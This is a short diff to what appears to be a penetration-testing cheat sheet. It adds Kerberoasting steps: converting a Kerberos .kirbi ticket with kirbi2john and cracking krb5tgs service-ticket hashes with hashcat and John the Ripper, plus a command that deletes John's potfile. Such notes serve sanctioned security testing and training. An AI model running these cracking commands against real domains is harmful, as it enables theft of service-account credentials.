@@ -319,7 +319,18 @@ hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt --show
 john hashestgt.txt --wordlist=wordlist.txt
 john --format=krb5tgs hashestgt.txt --wordlist=wordlist.txt
 john --show hashestgt.txt
+rm  /root/.john/john.pot
 ```
+##### KERBEROS - CONVERTER TICKET KIRBI PARA BASE64
+```
+kirbi2john ticket.kirbi > ticket.john
+john -format=krb5tgs ticket.john --wordlist=wordlist.txt
+john -format=krb5tgs ticket.john --show
+hashcat -m 13100 -a 0 ticket.john wordlist.txt
+hashcat -m 13100 -a 0 ticket.john wordlist.txt --show
+hashcat -m 13100 -a 0 ticket.john wordlist.txt --potfile-disable
+```
+
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
